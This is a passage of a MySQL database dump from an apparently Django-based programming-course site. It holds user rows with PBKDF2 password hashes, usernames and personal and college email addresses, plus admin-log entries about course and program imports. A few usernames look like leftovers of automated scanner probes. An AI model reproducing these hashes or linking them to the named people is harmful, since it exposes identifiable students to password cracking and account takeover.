03:29:59.705189'),(314,'pbkdf2_sha256$600000$kgFAfrLbxLNF6An7jtorF7$EeeIGvK8yTh8V0W7fsw8TnlYs4cfuTc7jQnhRHMO79M=','2024-08-10 04:34:06.827454',0,'Nandana_D','','','',0,1,'2024-05-28 03:31:36.557343'),(315,'pbkdf2_sha256$600000$L4VojWUTVOE6QIEGS1yixK$BDSHbtZ5rz2ZcF81e2suw9UDQdWDprabUwuhtdPdzhg=','2024-05-28 03:32:06.643714',0,'surya_v07','','','',0,1,'2024-05-28 03:32:05.895294'),(316,'pbkdf2_sha256$600000$oGQv8cwOolYK5qlYn3XVPX$+x+7k4XNMmBXXgzG67/E7SX+l90RI5NNzl0X2QGXOaE=','2024-05-28 03:33:32.106414',0,'ATHEES_G','','','',0,1,'2024-05-28 03:33:31.339608'),(317,'pbkdf2_sha256$600000$dYv4GmMiPfA5iEJVZzcAwE$J1Ts5NPLXQ3EPzakABw0zRKW+dmU9BjjBa2XQR1jxIw=','2024-05-28 03:34:32.653102',0,'IAjish','','','',0,1,'2024-05-28 03:34:31.734475'),(318,'pbkdf2_sha256$600000$resoxQzGj2QzPUBSWEEDmK$wk7KGlI0dMuc0PTb7NuB9a4bon8IOtVwmxpzrPvMJYo=','2024-05-31 03:37:34.991251',0,'au721221243056','','','',0,1,'2024-05-31 03:37:34.167159'),(319,'pbkdf2_sha256$600000$Ly7DGeU4GieXB9CNXmY1dG$tEhDnhg4Gd1xU+CrkqqTlh+FwoA3SEQmhh/k6GTVSVk=','2024-05-31 10:20:23.436997',0,'murukanmani919@gmail.com','','','',0,1,'2024-05-31 10:20:22.725759'),(320,'pbkdf2_sha256$600000$n3xqgRufP0ELW9vcq0b7QA$88QfHp3GSpfDCteXeZ/KrQlnXDON+sJsNzn0ChrHR2I=','2024-07-29 22:07:19.938621',0,'ghovjnjv','','','',0,1,'2024-07-29 22:01:22.875403'),(321,'pbkdf2_sha256$600000$ZqA8quSVjD97MZjFDdSyRE$rr4w116wn22UBX4QkEDojgoyAUHw8IYX4CcJVO2H2aE=','2024-07-29 22:04:25.364631',0,'bxss.me','','','',0,1,'2024-07-29 22:04:24.826992'),(322,'pbkdf2_sha256$600000$KbnmMJYocgBlzlR6zbwbBa$hCs5EGQQxfto7XhkJiCb7DudTy097H5FVhmjLwKG19U=','2024-07-29 22:18:48.133609',0,'ghovjnjvz43pRsqX','','','',0,1,'2024-07-29 22:18:47.653237'),(323,'pbkdf2_sha256$600000$c3wL3LfpNW3poCwFEoCpnQ$BjhY7b/KWvgKdw0S2vupgnvOmNL71mot+n2I4CQqbXM=','2024-07-29 22:24:12.103073',0,'@@9t3dS','','','',0,1,'2024-07-29 22:24:11.540325'),(324,'pbkdf2_sha256$600000$CryLXu7hES52Ax20TVpDx1$C1KSXODN0yln8ol6uTFbTMmqakwPavYQkKlUKbx516g=','2024-08-24 04:36:43.628295',0,'arikaran__r','','','',0,1,'2024-08-10 04:26:45.384689'),(325,'pbkdf2_sha256$600000$EjjBVXCXkyJvsi0CX3Tyxn$n0KkDPYH85RbJDIu3vOg+Rlt/qCZiLqwAQt7T7+zS1Y=','2024-08-24 04:36:07.964528',0,'Haribabu_04_m','','','',0,1,'2024-08-10 04:27:09.935546'),(326,'pbkdf2_sha256$600000$1jfSxIB0UaNXzKRBOxX8wy$sAIvBpQzAl7MYNgNN2x/AmSSHTkiUtCJcJkrVmmR8js=','2024-08-24 04:37:20.226217',0,'jeevanand','','','',0,1,'2024-08-10 04:27:17.847740'),(327,'pbkdf2_sha256$600000$TJGU9Y2cA8N3h7SuJokhFo$5EC9leJJr5BM9VITLdpjMJQhHBczdB1ypI3T8Av29ZY=','2024-08-10 04:27:56.763400',0,'raju096','','','',0,1,'2024-08-10 04:27:56.228730'),(328,'pbkdf2_sha256$600000$kR6BNwZuh4vjzOxREfIHPA$19dl2t/qrfxj7flnlzQuTzc9OS2U3FZBGIElciiW+5c=','2024-08-10 04:28:31.840174',0,'muralidharan@1708','','','',0,1,'2024-08-10 04:28:31.327086'),(329,'pbkdf2_sha256$600000$0IykOMZ0Ip6LiUvVYPblBX$/T3e7N5CyaEYOb2djbkH2c9Ml9XsIeT0sd+vqYfA1OY=','2024-08-10 04:34:30.138315',0,'pooja_shree','','','',0,1,'2024-08-10 04:28:50.354494'),(330,'pbkdf2_sha256$600000$FEYNSO0zzaL6EgP10fjvuJ$RcsqdWWUMvhcfB94kdJ5ko6tZiTYRZeyaCHOMWtQEQw=','2024-08-10 04:29:17.412680',0,'Karthikeyan@2006','','','',0,1,'2024-08-10 04:29:16.815341'),(331,'pbkdf2_sha256$600000$JeuEBnG62iFKGPlKjY2Qc6$L9ItbD2auJabdFpjmdeQ0aH26ktmmMi8lnWU1iSoFnE=','2024-08-24 04:38:29.151744',0,'Kanishkar_V','','','',0,1,'2024-08-10 04:29:31.335333'),(332,'pbkdf2_sha256$600000$rkH09h6b1IvhYXxsOtms63$nMbfJWlMTnwaWFsKdWsbnhbm9x7TAe/eK3BDVWBoXms=','2024-08-10 04:31:05.776983',0,'kaviya@55','','','',0,1,'2024-08-10 04:31:05.192038'),(333,'pbkdf2_sha256$600000$8w9CnChWr4nEvJBJva8s2s$+g2TUxKHEkALkPdYkaXTwKtXfYT3F0qsF4GNhQ+OVxg=','2024-08-10 04:36:07.552699',0,'Nivetha_S','','','',0,1,'2024-08-10 04:36:07.000176'),(334,'pbkdf2_sha256$600000$B0vCrkqUSOIFa0yZjnLt2M$guHwHkC2UpaVrRlN+urs2V5LMd9UOusHdCbfh8lhZjE=','2024-08-10 14:53:31.478239',0,'Surya_Prabha_18','','','',0,1,'2024-08-10 14:53:30.972220'),(335,'pbkdf2_sha256$600000$DYicQ87PF1hXEsurJvcHsl$8AAd4qKYaux5uYrY+nuC/hhQJaZP94zyg6qfI0G138A=','2024-08-13 04:19:39.208307',0,'dhanusridk2005@gmail.com','','','',0,1,'2024-08-13 04:19:38.569955'),(336,'pbkdf2_sha256$600000$nIJtfvjznrGEPkdZeErWNX$/BzpSlDGYWI2KMbezvl5X3gI1+7RXr0s8Quj6vgXJx0=','2024-08-13 04:20:27.203718',0,'lakshya','','','',0,1,'2024-08-13 04:20:26.449193'),(337,'pbkdf2_sha256$600000$mR5sYD7z7RFDSkCzhUkq4n$nP8peUen68IqUsxQdja5gehuN0ItwV03jkxHRG4Jt+A=','2024-08-13 04:20:53.703669',0,'the_bav22','','','',0,1,'2024-08-13 04:20:53.057702'),(338,'pbkdf2_sha256$600000$r1q5fGWgNldjirpBXjBiDQ$CeG1l7FnngkKp544Wfgw5zQBwbTakripU0R8uwq9+Es=','2024-09-26 04:50:09.769577',0,'Nandanaraj@511','','','',0,1,'2024-08-13 04:21:53.211014'),(339,'pbkdf2_sha256$600000$mOq8rwCbVw6lXumZkurYqF$gOuiK65gBFnd7vyQRSjmFtqMb94N9HJ6ACMrWLKwbNY=','2024-08-13 04:22:04.850060',0,'Vidhya_Sri','','','',0,1,'2024-08-13 04:22:04.260385'),(340,'pbkdf2_sha256$600000$qZTU01qVvi5BX601U9KonA$ed1nvzHWjS5kIf5ss8wiTd9ws3Tww7KDJL6cblhRz5k=','2024-08-13 04:22:19.305646',0,'mahendran','','','',0,1,'2024-08-13 04:22:18.674196'),(341,'pbkdf2_sha256$600000$VFYxLuKHb7JZA1jyxxJ0Fk$YsOfWqvY4cG//I5EAHBJHnAngPil1mxeSkw4fqXMy/o=','2024-08-24 04:38:05.675944',0,'22csa47@karpagamtech.ac.in','','','',0,1,'2024-08-24 04:36:04.217783'),(342,'pbkdf2_sha256$600000$FKsoY1Po0cakibfxSTvxVS$PUK7Gbd6K4CVGOzGmXw+Ii15pbosnkE+Q0KE+/KE5Yk=','2024-08-24 04:36:20.075641',0,'karthisankar205@gmail.com','','','',0,1,'2024-08-24 04:36:19.527970'),(343,'pbkdf2_sha256$600000$NCGZCAa1ZyCTIxbqcm9god$vIfIyiDbCoO+9GvYSXMQdLoxDbe03QOpHr3GVnfmawk=','2024-08-24 04:37:17.967214',0,'pandiyanpalani37@gmail.com','','','',0,1,'2024-08-24 04:37:17.236377'),(344,'pbkdf2_sha256$600000$yeTqnzh3PrAcHhBja8lhbN$Ryfr1dUpPIXAry4UHP72Y7K99YSwAim+QDiBr4f215Y=','2024-08-24 04:38:20.424824',0,'gopinathshanmugavel@gmail.com','','','',0,1,'2024-08-24 04:38:19.841962'),(345,'pbkdf2_sha256$600000$982w1rypJyd2hBtEWg3VIb$fTR65Ov+HJfM90hih38SqdRW35Rl/LLk15+Pzch3WYw=','2024-08-24 04:38:29.603320',0,'kavin_thangavel','','','',0,1,'2024-08-24 04:38:29.070300'),(346,'pbkdf2_sha256$600000$T5PjETVkgdCzIijRuvmBqo$+KAEDuhQaKhFAZC80A4bnsTo36+0in+4c6QxBmfUOs0=','2024-08-24 04:39:10.686758',0,'giriperiyasamy07@gmail.com','','','',0,1,'2024-08-24 04:39:10.085060'),(347,'pbkdf2_sha256$600000$8z2Yx5swS3qxLHdErvlQFm$6qynlzrGr0Xe0x0DE2GBdbcG8Ev4WRGAR2H9AfO9ceI=','2024-08-24 04:39:43.248897',0,'22eca03@karpagamtech.ac.in','','','',0,1,'2024-08-24 04:39:42.601092'),(348,'pbkdf2_sha256$600000$tN7WlTnE4ePB5bXRbPDvhE$JDkKxtjdTKj8Dxxt/zNbbkwngu1gZlLM+exbfBdWy48=','2024-08-24 04:40:02.321386',0,'karthisankar2005@gmail.com','','','',0,1,'2024-08-24 04:40:01.638050'),(349,'pbkdf2_sha256$600000$6RawXn2mpVtoe2jk01pfcU$BC23Yxnqqh6B03rAAIqU02HruKovda8kJZ4SQ3YB3zE=','2024-10-24 05:53:57.036734',0,'shreesharadhakrishnan@gmail.com','','','',0,1,'2024-08-24 04:40:14.825597'),(350,'pbkdf2_sha256$600000$BRGhvy8fL4jit7NymqSiMp$40i7x7go6lY0mqogWHjlwxHY4ZBLhd+UdkEOqbxSDBY=','2024-09-28 05:25:52.639407',0,'shaunmugapriya@gmail.com','','','',0,1,'2024-08-24 04:40:16.730143'),(351,'pbkdf2_sha256$600000$ew3ZFV1qPTdtCfARj1BFES$d5HpQZRIMHtK1zEUddZiHrBxtOKlOjA5M5JziFiLX8A=','2024-08-24 04:53:29.967260',0,'sashanth','','','',0,1,'2024-08-24 04:53:29.448638'),(352,'pbkdf2_sha256$600000$bDzgEkl3y8tYRZdAFuUnCe$vzCw/715HRXhQ12DRvtryxrDAUt1hO6d3XtsFh/y0Fg=','2024-08-24 05:24:18.375865',0,'madhanmadhan89743@gmail.com','','','',0,1,'2024-08-24 05:24:17.810962'),(353,'pbkdf2_sha256$600000$ebCEwKQBn8jn3eIfAR6YV3$tOo4EOWyOKJe+kDdj/LO3ND78a2dW+vDr21SjDK4KVY=','2024-08-24 05:24:32.857111',0,'gokularamanaa23k@gmail.com','','','',0,1,'2024-08-24 05:24:32.284581'),(354,'pbkdf2_sha256$600000$HxbdxjXnltPHupqaYnj0L4$gpiLE4I+aIDvF9I8R6d04Dy+0O98YrbgcZ+mG537rNI=','2024-08-24 05:27:52.906721',0,'pbarath__1628','','','',0,1,'2024-08-24 05:27:52.312951'),(355,'pbkdf2_sha256$600000$QpT3ByPi4CodXiR3yFamYP$HgexhjXBLfnH/K4sCf3uHnGDD0iBj9szjzF7YMrYEcU=','2024-08-24 05:28:34.076379',0,'sai_krishna_07','','','',0,1,'2024-08-24 05:28:33.470714'),(356,'pbkdf2_sha256$600000$ZRJ5yQSSdmGZmxTTglUgxN$BTr/9vznaG7vls9zU0+e9lUnJi19Gbjf8P3XdiPkb4U=','2024-08-24 05:28:57.815084',0,'SOUNDAR','','','',0,1,'2024-08-24 05:28:57.173791'),(357,'pbkdf2_sha256$600000$17TAqDO8fEK3gtuTezqkPg$4bkRHRJ2gpQ5BFhH8SY1ajF+PzUXLMuaQDpv2nBiHLk=','2024-09-26 04:49:17.808384',0,'Agilan','','','',0,1,'2024-08-24 05:30:34.771517'),(358,'pbkdf2_sha256$600000$1H8mVFovPffIrCmJ5vpSDb$RHc/ihibTP1S27dvcNlg+yfI0zSMIWICDy2RdpRnDYg=','2024-08-24 14:30:17.241810',0,'sabari____2005','','','',0,1,'2024-08-24 14:30:16.670578'),(359,'pbkdf2_sha256$600000$MigC9ekrKvZsS1TOlmwUWv$FlnFxD9X45a7X5GnhOyrNnuMjicUpWHNbQkLMED0WzM=','2024-09-03 10:07:59.959403',0,'sabari7091095@gmail.com','','','',0,1,'2024-08-24 14:33:13.666019'),(360,'pbkdf2_sha256$600000$gn5uBAHrEnn6a5Tvj8CW6m$Jb12scAnPqerf4PDhzDri1ISI/MVa7bpqxOWomXam0w=','2024-08-27 02:22:31.137153',0,'22ita48@karpagamtech.ac.in','','','',0,1,'2024-08-27 02:22:30.586331'),(361,'pbkdf2_sha256$600000$VO5KWhnLaiH3iAGlfnjoiJ$XRYkhFDs851/46capHNSnIpA1GCwsVXd31+rjHgnIzY=','2024-08-31 01:17:59.078209',0,'vivisuresh239@gmail.com','','','',0,1,'2024-08-31 01:17:58.512622'),(362,'pbkdf2_sha256$600000$uG6nqcxtoQVSvNCgDe2TDo$pUAsf9A4gGyl5oauQldUTQJxIz1iC3CzWf8UJ/QouqI=','2024-09-02 14:51:24.436317',0,'Suriyasakthi','','','',0,1,'2024-09-02 14:51:23.955758'),(363,'pbkdf2_sha256$600000$xbykLwvpclwEAXfTyxTcst$ED9vL0EI9og23KJOwKqcosMQtKKtAGXASDUfRjdyb1c=','2024-10-14 04:28:22.300412',0,'23csa30@karpagamtech.ac.in','','','',0,1,'2024-09-26 04:49:28.072614'),(364,'pbkdf2_sha256$600000$ZHdNW72E7ObfH93ydN3v3s$8Zld+QSuKPtK7eN57HePBiQFwJNEzp/eo1FUjM8A1ME=','2024-09-28 05:26:11.182491',0,'bbharani188@gmail.com','','','',0,1,'2024-09-26 04:50:54.107861'),(365,'pbkdf2_sha256$600000$uQs0hCt6uaCzY6NU4wW9Un$AymCULUEFYqrsPJfwPAp85d8fp2W8gCFzZ6YaCWaeS8=','2024-09-26 04:54:04.530859',0,'Devadharshini','','','',0,1,'2024-09-26 04:54:03.977749'),(366,'pbkdf2_sha256$600000$JbYTOgIbolEEGZMsYrz1a1$2oLo2GvGXrMzwjpO9tcg165bXSUxDI+DXCEnvqtebc0=','2024-09-26 05:24:12.315465',0,'dineshsurrya66','','','',0,1,'2024-09-26 05:24:11.750944'),(367,'pbkdf2_sha256$600000$ave5bpFLVWNMnMnfZqfCY2$PyxTC0zIusp1DZB2QjG358IJthR04r7c5e7vYIAgLqU=','2024-09-26 05:25:14.502045',0,'Hari_Nivas','','','',0,1,'2024-09-26 05:25:13.917886'),(368,'pbkdf2_sha256$600000$5tnozF2nozVDLzEzssM4E5$Iv4A+59CuEwphc28zn+eIoDstvo0Oc6WFSPHuCGGpVA=','2024-10-08 08:15:45.810445',0,'test','','','',0,1,'2024-10-08 08:15:45.310962'),(369,'pbkdf2_sha256$600000$0ocw3pq6Oy9MK81uOU79JX$qpFJduAQakzFO/ZXU50Ickdnbb6tZOEBCW7VJsN4gsA=','2024-10-14 03:45:09.984826',0,'abinaya_229005','','','',0,1,'2024-10-14 03:45:09.436743'),(370,'pbkdf2_sha256$600000$cYz2r4r78dZg28ocr88Fg2$WHM6g3njy10dQCXQHlJFo5RVgsjmBMm2+hZ+8pNvnbY=','2024-10-17 08:29:08.699546',0,'vel','','','',0,1,'2024-10-17 08:04:40.835591'),(371,'pbkdf2_sha256$600000$i8CcRgf9YVTzBIe6ZkhkOk$sChktVxA8BD7qZk4ZbmqYKitvR5FXQgYS7C9c/b20MM=','2024-10-17 08:17:05.134942',0,'giri','','','',0,1,'2024-10-17 08:17:04.567075'),(372,'pbkdf2_sha256$600000$9Ht5BVVHSu9zL023QqEh4U$MGJ7iyI3/O/pGG2+TXdLqe1O90CIOPaZU5izoeLx74g=','2024-10-17 08:17:30.290590',0,'abi','','','',0,1,'2024-10-17 08:17:29.743251'),(373,'pbkdf2_sha256$720000$xtbYyh9OjXqDi6Zj7vQT2O$PwaHoGhtWa5zAf8QS7JzyrTCUGB4+20fbTcTBcx08Q8=','2025-02-19 12:24:42.530847',0,'devadev565','','','',0,1,'2025-02-19 12:24:41.825590'),(374,'pbkdf2_sha256$720000$fjG8RURRRMdBMXAA72Qta6$QoP/bp1XuIX8A/42auHG9av5exOYBCLp4qiyMukyL8Y=','2025-04-18 03:59:09.465633',0,'22ecb61@karpagamtech.ac.in','','','',0,1,'2025-04-18 03:59:08.713025'),(375,'pbkdf2_sha256$720000$J2dv919Kpdf12E7mXEnvpi$g1CEhOGEONF0aUbl8N2Rvuj9V/sKqd4cK8u56zF9VzU=','2025-05-26 09:58:49.277478',0,'NaveenaSreinivasan','','','',0,1,'2025-05-26 09:58:48.384162'),(376,'pbkdf2_sha256$720000$vZUYT1BVyV86pzwZ5tLKLT$cf8PvT4OQZpTXA87kJ6xInhDhQKXKiwMZYZlFFOWA1M=','2025-05-26 10:01:20.303035',0,'Archana','','','',0,1,'2025-05-26 10:01:19.516826'),(377,'pbkdf2_sha256$720000$mhIDLD8J201AU4B5lpUyPl$ysr1a4+USVP6PdHrpmvjcextDP4H1B3sgmtgdW/+tGg=','2025-05-28 12:46:41.956777',0,'saranya_g','','','',0,1,'2025-05-28 10:21:08.799349'),(378,'pbkdf2_sha256$720000$alIAfsbMKJpngfFOupVG4M$WVHbhR72/YTydi76PPaQVpPoUBl2QGQbn4uYTZvTd3M=','2025-05-28 11:55:04.117722',0,'Dhivya2504','','','',0,1,'2025-05-28 11:55:03.168140'),(379,'pbkdf2_sha256$720000$oNY3qf4mluGFr7NeSVIQId$4Gz3TPamBqqbjFsWrY6uTiWsgz5RWJWNGlPF8c1Dgko=','2025-05-28 11:59:13.700702',0,'nnagaraj6838@gmail.com','','','',0,1,'2025-05-28 11:59:12.831695'),(380,'pbkdf2_sha256$720000$iO8i5WZbQIVHd05FRcaWEU$6bMV1IjlnUY7T4NPB3Cvwszh3R3GUX2pFtgxdnK/8oE=','2025-05-28 14:21:33.022342',0,'thalesthales617@gmail.com','','','',0,1,'2025-05-28 11:59:21.443607'),(381,'pbkdf2_sha256$720000$Fxmv7BTJOqtDM8UdchPIVP$kGot+0JDOhZCdzT9Ticeims9zXWueoL6Bsye7+cdGe8=','2025-05-28 11:59:34.095514',0,'MAHADEVAN@27','','','',0,1,'2025-05-28 11:59:33.334948'),(382,'pbkdf2_sha256$720000$V4xv8IxMhRxbJ4Cid2PB3F$wqCRfFqabEXulrpnzskelniBdEw6tdUSja8B2sTuGko=','2025-05-28 12:35:33.618759',0,'Jannathul_nisha_s','','','',0,1,'2025-05-28 12:25:29.327025'),(383,'pbkdf2_sha256$720000$XxwN3ixHqLp71NKnIsgzzQ$JswvswmcudUfOozXrJAidEtfEhbFNZh3DPx7fp7E4Y8=','2025-05-28 12:34:45.513571',0,'nivethasubramani8482@gmail.com','','','',0,1,'2025-05-28 12:34:44.673278'),(384,'pbkdf2_sha256$720000$iEJE5htywMD70amR8l32vN$jiHWm9baYLOHcsTpEBlWgxi+2nr4AdzD4hp4g+tNSrI=','2025-05-28 13:00:55.493061',0,'22eea41','','','',0,1,'2025-05-28 13:00:54.606495'),(385,'pbkdf2_sha256$720000$P0ZX18WnnGgMjQJKKTyPCj$YZAL5v79PNbd/FJyj4ZVR+/DJRoCUME0CU+YV0Zi06c=','2025-05-28 13:08:37.294760',0,'Arshad','','','',0,1,'2025-05-28 13:08:36.504922'),(386,'pbkdf2_sha256$720000$QK5L1tmpmx3YpnK0ds6PQv$4LN2TPgkOUaMfOyV29VA18Z1S6a/DRA720Fyo9wY7M8=','2025-05-28 13:13:59.086306',0,'Srivarshini','','','',0,1,'2025-05-28 13:13:58.300548'),(387,'pbkdf2_sha256$720000$DDRMz6os2PwJ1rzPDDzZoD$QUoEkaW55kBUt+WXOhMT+M/c7tKZ1ePyQZxJxBCGcnw=','2025-05-28 13:18:19.965588',0,'1502sasikumar@','','','',0,1,'2025-05-28 13:18:19.119789'),(388,'pbkdf2_sha256$720000$DOJpzhctiyUSQ47WzHjC2M$kJQP5OUl3KqsuURD5vd94quLLwFEYI+JRB2kmXr2wpY=','2025-05-28 13:28:55.556537',0,'Ishvarya','','','',0,1,'2025-05-28 13:28:54.876778'),(389,'pbkdf2_sha256$720000$HJueojSG8OkfmLVcrNOUa8$1dsbHROlcfFjloQR3TfB/DVozrRn6qKBeZ6ZCHJZCoA=','2025-05-28 15:34:12.790896',0,'Kowsick','','','',0,1,'2025-05-28 15:34:12.082816'),(390,'pbkdf2_sha256$720000$CCLZgmuLz7ai9pdCD9Ao0Q$sbSgqG7MH5sK6gR9rb4vgSpppVgEnrL8UxVPPp1qpMI=','2025-05-28 17:20:29.683269',0,'subavenichandrasekaran','','','',0,1,'2025-05-28 17:20:28.943135'),(391,'pbkdf2_sha256$720000$vdECJKPzecDDqQK52CdqOL$pzzkINJaymtFxEhJEuGLfXfy8yJ/uxx1MM737+8guGc=','2025-05-29 11:51:43.879788',0,'Sriram@2004','','','',0,1,'2025-05-29 11:51:42.908475');
/*!40000 ALTER TABLE `auth_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user_groups`
--

DROP TABLE IF EXISTS `auth_user_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `auth_user_groups` (
  `id` int NOT NULL AUTO_INCREMENT,
  `user_id` int NOT NULL,
  `group_id` int NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `auth_user_groups_user_id_group_id_94350c0c_uniq` (`user_id`,`group_id`),
  KEY `auth_user_groups_user_id_6a12ed8b` (`user_id`),
  KEY `auth_user_groups_group_id_97559544` (`group_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user_groups`
--

LOCK TABLES `auth_user_groups` WRITE;
/*!40000 ALTER TABLE `auth_user_groups` DISABLE KEYS */;
INSERT INTO `auth_user_groups` VALUES (1,2,1);
/*!40000 ALTER TABLE `auth_user_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user_user_permissions`
--

DROP TABLE IF EXISTS `auth_user_user_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `auth_user_user_permissions` (
  `id` int NOT NULL AUTO_INCREMENT,
  `user_id` int NOT NULL,
  `permission_id` int NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `auth_user_user_permissions_user_id_permission_id_14a6b632_uniq` (`user_id`,`permission_id`),
  KEY `auth_user_user_permissions_user_id_a95ead1b` (`user_id`),
  KEY `auth_user_user_permissions_permission_id_1fbb5f2c` (`permission_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user_user_permissions`
--

LOCK TABLES `auth_user_user_permissions` WRITE;
/*!40000 ALTER TABLE `auth_user_user_permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_user_user_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_admin_log`
--

DROP TABLE IF EXISTS `django_admin_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `django_admin_log` (
  `id` int NOT NULL AUTO_INCREMENT,
  `action_time` datetime(6) NOT NULL,
  `object_id` longtext CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci,
  `object_repr` varchar(200) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `action_flag` smallint unsigned NOT NULL,
  `change_message` longtext CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `content_type_id` int DEFAULT NULL,
  `user_id` int NOT NULL,
  PRIMARY KEY (`id`),
  KEY `django_admin_log_content_type_id_c4bce8eb` (`content_type_id`),
  KEY `django_admin_log_user_id_c564eba6` (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4110 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_admin_log`
--

LOCK TABLES `django_admin_log` WRITE;
/*!40000 ALTER TABLE `django_admin_log` DISABLE KEYS */;
INSERT INTO `django_admin_log` VALUES (1,'2020-05-30 15:11:13.853747','1','C Programming',1,'[{\"added\": {}}]',9,1),(2,'2020-05-30 15:57:14.002619','1','C Programming',3,'',9,1),(3,'2020-05-30 16:02:09.100497','2','C Programming',1,'[{\"added\": {}}]',9,1),(4,'2020-05-30 16:15:42.283009','2','C Programming',3,'',9,1),(5,'2020-05-30 16:16:00.398045','3','C Programming',1,'[{\"added\": {}}]',9,1),(6,'2020-05-30 16:20:17.718763','3','C Programming',2,'[{\"changed\": {\"fields\": [\"Course description\", \"Reference\"]}}]',9,1),(7,'2020-05-31 12:27:57.088078','4','Problem Solving',1,'[{\"added\": {}}]',9,1),(8,'2020-05-31 12:28:54.879384','5','Python Programming',1,'[{\"added\": {}}]',9,1),(9,'2020-05-31 12:29:44.109200','6','Java Programming',1,'[{\"added\": {}}]',9,1),(10,'2020-05-31 12:31:17.377534','1','Language Basics',1,'[{\"added\": {}}]',8,1),(11,'2020-05-31 12:32:25.183413','2','Operators',1,'[{\"added\": {}}]',8,1),(12,'2020-05-31 12:33:00.397427','3','Branching',1,'[{\"added\": {}}]',8,1),(13,'2020-06-01 00:41:54.871023','3','Branching',2,'[{\"changed\": {\"fields\": [\"Chapter no\"]}}]',8,1),(14,'2020-06-01 01:06:57.141948','59','Program object (59)',1,'new through import_export',10,1),(15,'2020-06-01 01:06:57.206951','60','Program object (60)',1,'new through import_export',10,1),(16,'2020-06-01 01:06:57.211952','61','Program object (61)',1,'new through import_export',10,1),(17,'2020-06-01 01:06:57.215952','62','Program object (62)',1,'new through import_export',10,1),(18,'2020-06-01 01:06:57.220952','63','Program object (63)',1,'new through import_export',10,1),(19,'2020-06-01 01:06:57.224952','64','Program object (64)',1,'new through import_export',10,1),(20,'2020-06-01 01:06:57.230953','65','Program object (65)',1,'new through import_export',10,1),(21,'2020-06-01 01:06:57.234953','66','Program object (66)',1,'new through import_export',10,1),(22,'2020-06-01 01:06:57.281956','67','Program object (67)',1,'new through import_export',10,1),(23,'2020-06-01 01:06:57.286956','68','Program object (68)',1,'new through import_export',10,1),(24,'2020-06-01 01:06:57.302957','69','Program object (69)',1,'new through import_export',10,1),(25,'2020-06-01 01:06:57.306957','70','Program object (70)',1,'new through import_export',10,1),(26,'2020-06-01 01:06:57.313957','71','Program object (71)',1,'new through import_export',10,1),(27,'2020-06-01 01:06:57.318958','72','Program object (72)',1,'new through import_export',10,1),(28,'2020-06-01 01:06:57.333959','73','Program object (73)',1,'new through import_export',10,1),(29,'2020-06-01 01:06:57.338959','74','Program object (74)',1,'new through import_export',10,1),(30,'2020-06-01 01:06:57.342959','75','Program object (75)',1,'new through import_export',10,1),(31,'2020-06-01 01:06:57.349959','76','Program object (76)',1,'new through import_export',10,1),(32,'2020-06-01 01:06:57.365960','77','Program object (77)',1,'new through import_export',10,1),(33,'2020-06-01 01:06:57.369961','78','Program object (78)',1,'new through import_export',10,1),(34,'2020-06-01 01:06:57.374961','79','Program object (79)',1,'new through import_export',10,1),(35,'2020-06-01 01:06:57.378961','80','Program object (80)',1,'new through import_export',10,1),(36,'2020-06-01 01:06:57.383961','81','Program object (81)',1,'new through import_export',10,1),(37,'2020-06-01 01:06:57.388962','82','Program object (82)',1,'new through import_export',10,1),(38,'2020-06-01 01:06:57.398962','83','Program object (83)',1,'new through import_export',10,1),(39,'2020-06-01 01:06:57.402962','84','Program object (84)',1,'new through import_export',10,1),(40,'2020-06-01 01:06:57.407963','85','Program object (85)',1,'new through import_export',10,1),(41,'2020-06-01 01:06:57.411963','86','Program object (86)',1,'new through import_export',10,1),(42,'2020-06-01 01:06:57.416963','87','Program object (87)',1,'new through import_export',10,1),(43,'2020-06-01 01:06:57.421964','88','Program object (88)',1,'new through import_export',10,1),(44,'2020-06-01 01:06:57.426964','89','Program object (89)',1,'new through import_export',10,1),(45,'2020-06-01 01:06:57.431964','90','Program object (90)',1,'new through import_export',10,1),(46,'2020-06-01 01:06:57.436964','91','Program object (91)',1,'new through import_export',10,1),(47,'2020-06-01 01:06:57.440965','92','Program object (92)',1,'new through import_export',10,1),(48,'2020-06-01 01:06:57.445965','93','Program object (93)',1,'new through import_export',10,1),(49,'2020-06-01 01:06:57.454965','94','Program object (94)',1,'new through import_export',10,1),(50,'2020-06-01 01:06:57.459966','95','Program object (95)',1,'new through import_export',10,1),(51,'2020-06-01 01:06:57.463966','96','Program object (96)',1,'new through import_export',10,1),(52,'2020-06-01 01:06:57.469966','97','Program object (97)',1,'new through import_export',10,1),(53,'2020-06-01 01:06:57.474967','98','Program object (98)',1,'new through import_export',10,1),(54,'2020-06-01 01:06:57.490968','99','Program object (99)',1,'new through import_export',10,1),(55,'2020-06-01 01:06:57.495968','100','Program object (100)',1,'new through import_export',10,1),(56,'2020-06-01 01:06:57.499968','101','Program object (101)',1,'new through import_export',10,1),(57,'2020-06-01 01:06:57.503968','102','Program object (102)',1,'new through import_export',10,1),(58,'2020-06-01 01:06:57.508969','103','Program object (103)',1,'new through import_export',10,1),(59,'2020-06-01 01:06:57.512969','104','Program object (104)',1,'new through import_export',10,1),(60,'2020-06-01 